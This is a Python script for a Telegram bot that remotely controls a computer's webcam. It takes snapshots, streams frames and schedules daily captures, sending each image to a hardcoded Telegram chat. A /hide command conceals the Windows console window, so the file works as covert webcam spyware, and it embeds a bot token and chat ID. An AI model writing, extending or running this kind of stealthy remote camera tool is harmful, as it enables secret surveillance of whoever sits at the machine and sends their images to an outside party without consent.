import cv2
import telebot
import threading
import time
import base64
import os
import schedule          # <--- NEW
from datetime import datetime

BOT_TOKEN = "8842112440:AAEqMJ3hYkznPS-BD8jKvE0eciyUMAtu688"
CHAT_ID = "7641964482"

bot = telebot.TeleBot(BOT_TOKEN)
camera = None
streaming = False
auto_capture_enabled = False   # <--- NEW

def init_camera():
    global camera
    if camera is None or not camera.isOpened():
        camera = cv2.VideoCapture(0)
        if not camera.isOpened():
            raise Exception("Camera open failed")
    return camera

def capture_frame():
    cam = init_camera()
    ret, frame = cam.read()
    if not ret:
        return None
    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
    return base64.b64encode(buffer).decode('utf-8')

def send_photo_to_tg(image_b64):
    import requests
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    data = {"chat_id": CHAT_ID, "photo": image_b64, 
            "caption": f"Auto-capture {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
    try:
        requests.post(url, json=data, timeout=5)
    except:
        pass

def auto_capture_job():   # <--- NEW
    if auto_capture_enabled:
        img = capture_frame()
        if img:
            send_photo_to_tg(img)
            print(f"[Auto] Captured at {datetime.now()}")

def stream_frames(interval=1.0):
    global streaming
    while streaming:
        img_b64 = capture_frame()
        if img_b64:
            send_photo_to_tg(img_b64)
        time.sleep(interval)

# ===== TELEGRAM COMMANDS =====
@bot.message_handler(commands=['start', 'help'])
def send_help(message):
    bot.reply_to(message, "Commands:\n/snap - one shot\n/start_stream [sec] - stream\n/stop_stream\n/auto_start [HH:MM] - auto capture daily\n/auto_stop - stop auto\n/hide - hide console\n/exit - quit")

@bot.message_handler(commands=['snap'])
def snap_command(message):
    bot.reply_to(message, "Capturing...")
    img = capture_frame()
    if img:
        send_photo_to_tg(img)
        bot.reply_to(message, "Sent")
    else:
        bot.reply_to(message, "Camera error")

@bot.message_handler(commands=['start_stream'])
def start_stream_command(message):
    global streaming
    if streaming:
        bot.reply_to(message, "Stream already active")
        return
    args = message.text.split()
    interval = 1.0
    if len(args) > 1:
        try: interval = float(args[1])
        except: pass
    streaming = True
    threading.Thread(target=stream_frames, args=(interval,), daemon=True).start()
    bot.reply_to(message, f"Stream started, interval {interval}s")

@bot.message_handler(commands=['stop_stream'])
def stop_stream_command(message):
    global streaming
    streaming = False
    bot.reply_to(message, "Stream stopped")

@bot.message_handler(commands=['auto_start'])   # <--- NEW
def auto_start_command(message):
    global auto_capture_enabled
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /auto_start HH:MM  (example: /auto_start 14:30)")
        return
    time_str = args[1]
    try:
        schedule.every().day.at(time_str).do(auto_capture_job)
        auto_capture_enabled = True
        bot.reply_to(message, f"Auto-capture scheduled daily at {time_str}")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['auto_stop'])   # <--- NEW
def auto_stop_command(message):
    global auto_capture_enabled
    auto_capture_enabled = False
    schedule.clear()
    bot.reply_to(message, "Auto-capture stopped")

@bot.message_handler(commands=['hide'])
def hide_command(message):
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        bot.reply_to(message, "Console hidden")
    except:
        bot.reply_to(message, "Not Windows or no access")

@bot.message_handler(commands=['exit'])
def exit_command(message):
    global streaming, camera, auto_capture_enabled
    streaming = False
    auto_capture_enabled = False
    if camera:
        camera.release()
    bot.reply_to(message, "Exiting...")
    os._exit(0)

def schedule_checker():   # <--- NEW (background thread)
    while True:
        schedule.run_pending()
        time.sleep(30)

def main():
    print("Bot started. Commands: /auto_start HH:MM  (example: /auto_start 09:00)")
    # start background scheduler thread
    threading.Thread(target=schedule_checker, daemon=True).start()
    bot.infinity_polling()

if __name__ == "__main__":
    main()
